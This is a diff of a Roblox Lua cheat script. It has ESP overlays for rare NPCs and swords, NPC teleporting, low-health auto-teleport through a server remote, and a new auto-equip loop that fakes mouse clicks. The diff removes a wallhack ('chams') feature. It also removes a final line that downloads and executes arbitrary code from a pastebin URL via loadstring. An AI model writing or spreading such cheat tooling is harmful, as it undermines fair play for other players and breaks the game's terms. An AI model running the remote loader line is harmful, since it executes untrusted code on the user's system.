@@ -3,6 +3,7 @@ local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local SoundService = game:GetService("SoundService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 
 local player = Players.LocalPlayer
 
@@ -23,15 +24,10 @@ local MIN_RARITY = 63
 local espObjects = {}
 
 -- ==================== LOW HEALTH TELEPORT CONFIGURATION ====================
-local LOW_HEALTH_THRESHOLD_WITH_PLAYERS = 0.5 -- 65% when players nearby
-local LOW_HEALTH_THRESHOLD_NO_PLAYERS = 0.25 -- 30% when no players nearby
+local LOW_HEALTH_THRESHOLD_WITH_PLAYERS = 0.5
+local LOW_HEALTH_THRESHOLD_NO_PLAYERS = 0.25
 local PLAYER_DETECTION_RANGE = 750
-local wasAboveThreshold = true -- Track if we were above threshold
-
--- ==================== CHAMS CONFIGURATION ====================
-local CHAMS_RANGE = 750
-local chamsEnabled = false
-local chamObjects = {}
+local wasAboveThreshold = true
 
 -- ==================== SWORD DAMAGE ESP CONFIGURATION ====================
 local swordDMGEnabled = true
@@ -41,6 +37,13 @@ local swordESPObjects = {}
 local fortuneAncientEnabled = true
 local fortuneAncientParts = {}
 local trackedSwords = {}
+
+-- ==================== AUTO EQUIP CONFIGURATION ====================
+local autoEquipEnabled = false
+local CYCLE_DELAY = 0.33
+local CHARACTER_REFRESH = 0.2
+local autoEquipCharacter
+local autoEquipHumanoid
 
 -- ==================== NUMBER ABBREVIATION FUNCTION ====================
 local function abbreviateNumber(num)
@@ -115,8 +118,8 @@ local function createGUI()
     
     local popupFrame = Instance.new("Frame")
     popupFrame.Name = "PopupFrame"
-    popupFrame.Size = UDim2.new(0, 250, 0, 200)
-    popupFrame.Position = UDim2.new(1, -270, 1, -320)
+    popupFrame.Size = UDim2.new(0, 250, 0, 250)
+    popupFrame.Position = UDim2.new(1, -270, 1, -370)
     popupFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     popupFrame.BorderSizePixel = 2
     popupFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
@@ -139,21 +142,21 @@ local function createGUI()
     titleLabel.TextXAlignment = Enum.TextXAlignment.Center
     titleLabel.Parent = popupFrame
     
-    local chamsButton = Instance.new("TextButton")
-    chamsButton.Name = "ChamsButton"
-    chamsButton.Size = UDim2.new(1, -20, 0, 40)
-    chamsButton.Position = UDim2.new(0, 10, 0, 50)
-    chamsButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-    chamsButton.BorderSizePixel = 0
-    chamsButton.Text = "chams: off"
-    chamsButton.TextColor3 = Color3.fromRGB(255, 70, 70)
-    chamsButton.TextSize = 16
-    chamsButton.Font = Enum.Font.GothamBold
-    chamsButton.Parent = popupFrame
+    local teleportButton = Instance.new("TextButton")
+    teleportButton.Name = "TeleportButton"
+    teleportButton.Size = UDim2.new(1, -20, 0, 40)
+    teleportButton.Position = UDim2.new(0, 10, 0, 50)
+    teleportButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    teleportButton.BorderSizePixel = 0
+    teleportButton.Text = "teleport: off"
+    teleportButton.TextColor3 = Color3.fromRGB(255, 70, 70)
+    teleportButton.TextSize = 16
+    teleportButton.Font = Enum.Font.GothamBold
+    teleportButton.Parent = popupFrame
     
-    local chamsCorner = Instance.new("UICorner")
-    chamsCorner.CornerRadius = UDim.new(0, 8)
-    chamsCorner.Parent = chamsButton
+    local teleportCorner = Instance.new("UICorner")
+    teleportCorner.CornerRadius = UDim.new(0, 8)
+    teleportCorner.Parent = teleportButton
     
     local swordDMGButton = Instance.new("TextButton")
     swordDMGButton.Name = "SwordDMGButton"
@@ -161,8 +164,8 @@ local function createGUI()
     swordDMGButton.Position = UDim2.new(0, 10, 0, 100)
     swordDMGButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
     swordDMGButton.BorderSizePixel = 0
-    swordDMGButton.Text = "swordDMG: off"
-    swordDMGButton.TextColor3 = Color3.fromRGB(255, 70, 70)
+    swordDMGButton.Text = "swordDMG: on"
+    swordDMGButton.TextColor3 = Color3.fromRGB(70, 255, 70)
     swordDMGButton.TextSize = 16
     swordDMGButton.Font = Enum.Font.GothamBold
     swordDMGButton.Parent = popupFrame
@@ -177,8 +180,8 @@ local function createGUI()
     fortuneAncientButton.Position = UDim2.new(0, 10, 0, 150)
     fortuneAncientButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
     fortuneAncientButton.BorderSizePixel = 0
-    fortuneAncientButton.Text = "fortune+ancient: off"
-    fortuneAncientButton.TextColor3 = Color3.fromRGB(255, 70, 70)
+    fortuneAncientButton.Text = "fortune+ancient: on"
+    fortuneAncientButton.TextColor3 = Color3.fromRGB(70, 255, 70)
     fortuneAncientButton.TextSize = 16
     fortuneAncientButton.Font = Enum.Font.GothamBold
     fortuneAncientButton.Parent = popupFrame
@@ -187,20 +190,38 @@ local function createGUI()
     fortuneAncientCorner.CornerRadius = UDim.new(0, 8)
     fortuneAncientCorner.Parent = fortuneAncientButton
     
+    local autoEquipButton = Instance.new("TextButton")
+    autoEquipButton.Name = "AutoEquipButton"
+    autoEquipButton.Size = UDim2.new(1, -20, 0, 40)
+    autoEquipButton.Position = UDim2.new(0, 10, 0, 200)
+    autoEquipButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    autoEquipButton.BorderSizePixel = 0
+    autoEquipButton.Text = "autoEquip: off"
+    autoEquipButton.TextColor3 = Color3.fromRGB(255, 70, 70)
+    autoEquipButton.TextSize = 16
+    autoEquipButton.Font = Enum.Font.GothamBold
+    autoEquipButton.Parent = popupFrame
+    
+    local autoEquipCorner = Instance.new("UICorner")
+    autoEquipCorner.CornerRadius = UDim.new(0, 8)
+    autoEquipCorner.Parent = autoEquipButton
+    
     mainButton.MouseButton1Click:Connect(function()
         popupFrame.Visible = not popupFrame.Visible
     end)
     
-    chamsButton.MouseButton1Click:Connect(function()
-        chamsEnabled = not chamsEnabled
-        if chamsEnabled then
-            chamsButton.Text = "chams: on"
-            chamsButton.TextColor3 = Color3.fromRGB(70, 255, 70)
+    teleportButton.MouseButton1Click:Connect(function()
+        teleportEnabled = not teleportEnabled
+        if teleportEnabled then
+            teleportButton.Text = "teleport: on"
+            teleportButton.TextColor3 = Color3.fromRGB(70, 255, 70)
+            print("NPC Teleport: ENABLED")
+            teleportLoop()
         else
-            chamsButton.Text = "chams: off"
-            chamsButton.TextColor3 = Color3.fromRGB(255, 70, 70)
-            for npc, highlight in pairs(chamObjects) do highlight:Destroy() end
-            chamObjects = {}
+            teleportButton.Text = "teleport: off"
+            teleportButton.TextColor3 = Color3.fromRGB(255, 70, 70)
+            print("NPC Teleport: DISABLED")
+            stopTeleportLoop()
         end
     end)
     
@@ -228,6 +249,17 @@ local function createGUI()
             for sword, part in pairs(fortuneAncientParts) do part:Destroy() end
             fortuneAncientParts = {}
             trackedSwords = {}
+        end
+    end)
+    
+    autoEquipButton.MouseButton1Click:Connect(function()
+        autoEquipEnabled = not autoEquipEnabled
+        if autoEquipEnabled then
+            autoEquipButton.Text = "autoEquip: on"
+            autoEquipButton.TextColor3 = Color3.fromRGB(70, 255, 70)
+        else
+            autoEquipButton.Text = "autoEquip: off"
+            autoEquipButton.TextColor3 = Color3.fromRGB(255, 70, 70)
         end
     end)
     
@@ -296,7 +328,7 @@ local function removeBodyMovers()
     if bodyGyro then bodyGyro:Destroy() bodyGyro = nil end
 end
 
-local function teleportLoop()
+function teleportLoop()
     local lastCheck = 0
     teleportConnection = RunService.Heartbeat:Connect(function(deltaTime)
         if not teleportEnabled then return end
@@ -326,21 +358,10 @@ local function teleportLoop()
     end)
 end
 
-local function stopTeleportLoop()
+function stopTeleportLoop()
     if teleportConnection then teleportConnection:Disconnect() teleportConnection = nil end
     removeBodyMovers()
     currentTarget = nil
-end
-
-local function toggleTeleport()
-    teleportEnabled = not teleportEnabled
-    if teleportEnabled then
-        print("NPC Teleport: ENABLED")
-        teleportLoop()
-    else
-        print("NPC Teleport: DISABLED")
-        stopTeleportLoop()
-    end
 end
 
 -- ==================== ESP FUNCTIONS ====================
@@ -407,69 +428,6 @@ local function espLoop()
             if not checkedNPCs[npc] or not npc.Parent then removeESP(npc) end
         end
     end)
-end
-
--- ==================== CHAMS FUNCTIONS ====================
-local function createChams(npc)
-    if chamObjects[npc] then return end
-    local humanoid = npc:FindFirstChildOfClass("Humanoid")
-    if not humanoid then return end
-    local highlight = Instance.new("Highlight")
-    highlight.Name = "ChamsHighlight"
-    highlight.Adornee = npc
-    highlight.FillColor = Color3.fromRGB(39, 169, 245)
-    highlight.OutlineColor = Color3.fromRGB(217, 157, 242)
-    highlight.FillTransparency = 0.6
-    highlight.OutlineTransparency = 0
-    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-    highlight.Parent = npc
-    chamObjects[npc] = highlight
-end
-
-local function removeChams(npc)
-    if chamObjects[npc] then chamObjects[npc]:Destroy() chamObjects[npc] = nil end
-end
-
-local function updateChams()
-    local character = player.Character
-    if not character or not character:FindFirstChild("HumanoidRootPart") then return end
-    local rootPart = character.HumanoidRootPart
-    local npcsFolder = workspace:FindFirstChild("NPCs")
-    if not npcsFolder then return end
-    local closestNPC = nil
-    local closestDistance = math.huge
-    local checkedNPCs = {}
-    for _, npc in pairs(npcsFolder:GetChildren()) do
-        if npc:IsA("Model") then
-            local humanoid = npc:FindFirstChildOfClass("Humanoid")
-            local npcRoot = npc:FindFirstChild("HumanoidRootPart") or npc.PrimaryPart
-            if humanoid and humanoid.Health > 0 and npcRoot then
-                checkedNPCs[npc] = true
-                local distance = (rootPart.Position - npcRoot.Position).Magnitude
-                if distance <= CHAMS_RANGE then
-                    if chamsEnabled then
-                        createChams(npc)
-                        if distance < closestDistance then
-                            closestDistance = distance
-                            closestNPC = npc
-                        end
-                    end
-                else removeChams(npc) end
-            else removeChams(npc) end
-        end
-    end
-    for npc, highlight in pairs(chamObjects) do
-        if not checkedNPCs[npc] or not npc.Parent then removeChams(npc)
-        elseif npc == closestNPC then highlight.FillColor = Color3.fromRGB(102, 209, 90)
-        else highlight.FillColor = Color3.fromRGB(167, 29, 226) end
-    end
-    if not chamsEnabled then
-        for npc, _ in pairs(chamObjects) do removeChams(npc) end
-    end
-end
-
-local function chamsLoop()
-    RunService.Heartbeat:Connect(function() updateChams() end)
 end
 
 -- ==================== SWORD DAMAGE ESP FUNCTIONS ====================
@@ -572,7 +530,6 @@ local function hasFortuneAndAncient(sword)
         if enchant == 0 then fortuneCount = fortuneCount + 1 end
         if enchant == 11 then ancientCount = ancientCount + 1 end
     end
-    -- At least 2 ancient OR (1 ancient and 2 fortune)
     return ancientCount >= 2 or (ancientCount >= 1 and fortuneCount >= 2)
 end
 
@@ -647,6 +604,66 @@ local function fortuneAncientLoop()
     RunService.Heartbeat:Connect(function() updateFortuneAncientParts() end)
 end
 
+-- ==================== AUTO EQUIP FUNCTIONS ====================
+local function setupAutoEquipCharacter(char)
+    autoEquipCharacter = char
+    autoEquipHumanoid = autoEquipCharacter:WaitForChild("Humanoid")
+end
+
+task.spawn(function()
+    while true do
+        local char = player.Character
+        if char and char ~= autoEquipCharacter then setupAutoEquipCharacter(char) end
+        task.wait(CHARACTER_REFRESH)
+    end
+end)
+
+local function getTools()
+    local tools = {}
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        for _,v in pairs(backpack:GetChildren()) do
+            if v:IsA("Tool") then table.insert(tools, v) end
+        end
+    end
+    if autoEquipCharacter then
+        for _,v in pairs(autoEquipCharacter:GetChildren()) do
+            if v:IsA("Tool") then table.insert(tools, v) end
+        end
+    end
+    return tools
+end
+
+local function clickCenter()
+    local cam = workspace.CurrentCamera
+    local vp = cam.ViewportSize
+    local x = vp.X / 2
+    local y = vp.Y / 2
+    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
+    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
+end
+
+task.spawn(function()
+    while true do
+        if not autoEquipEnabled then task.wait(0.1) continue end
+        if not autoEquipCharacter or not autoEquipHumanoid then task.wait(0.1) continue end
+        local tools = getTools()
+        if #tools <= 1 then task.wait(0.5) continue end
+        for i = 1, #tools do
+            if not autoEquipEnabled then break end
+            local tool = tools[i]
+            if tool and tool.Parent then
+                autoEquipHumanoid:UnequipTools()
+                task.wait()
+                if tool.Parent ~= autoEquipCharacter then autoEquipHumanoid:EquipTool(tool) end
+                task.wait(0.05)
+                clickCenter()
+                task.wait(CYCLE_DELAY)
+            end
+        end
+    end
+end)
+
 -- ==================== LOW HEALTH AUTO TELEPORT ====================
 local function setupHealthMonitor(character)
     local humanoid = character:WaitForChild("Humanoid")
@@ -662,7 +679,7 @@ local function setupHealthMonitor(character)
                 ReplicatedStorage:WaitForChild("Paper"):WaitForChild("Remotes"):WaitForChild("__remotefunction"):InvokeServer(unpack(args))
             end)
             if success then
-                local thresholdText = playerNearby and "65% (player nearby)" or "30% (no players)"
+                local thresholdText = playerNearby and "50% (player nearby)" or "25% (no players)"
                 print("Low Health Teleport: Activated at " .. math.floor(healthPercent * 100) .. "% health (" .. thresholdText .. ")")
             else warn("Low Health Teleport: Failed - " .. tostring(err)) end
         elseif healthPercent > threshold then wasAboveThreshold = true end
@@ -683,20 +700,28 @@ end)
 -- ==================== KEYBINDS ====================
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
-    if input.KeyCode == Enum.KeyCode.F then toggleTeleport() end
+    if input.KeyCode == Enum.KeyCode.F then
+        teleportEnabled = not teleportEnabled
+        if teleportEnabled then
+            print("NPC Teleport: ENABLED")
+            teleportLoop()
+        else
+            print("NPC Teleport: DISABLED")
+            stopTeleportLoop()
+        end
+    end
+    if input.KeyCode == Enum.KeyCode.J then autoEquipEnabled = not autoEquipEnabled end
 end)
 
 -- ==================== INITIALIZATION ====================
 createGUI()
 espLoop()
 print("High Rarity ESP: ENABLED (Always On)")
-chamsLoop()
-print("Chams System: Ready")
 swordESPLoop()
 print("Sword Damage ESP System: Ready")
 fortuneAncientLoop()
 print("Fortune + Ancient System: Ready")
 if player.Character then setupHealthMonitor(player.Character) end
 print("NPC Teleport Script Loaded! Press F to toggle.")
-print("Low Health Auto-Teleport: ENABLED (65% with players nearby, 30% when alone)")
-loadstring(game:HttpGetAsync('https://pastebin.com/raw/WgkcDYUs'))()
+print("Auto Equip: Press J to toggle")
+print("Low Health Auto-Teleport: ENABLED (50% with players nearby, 25% when alone)")
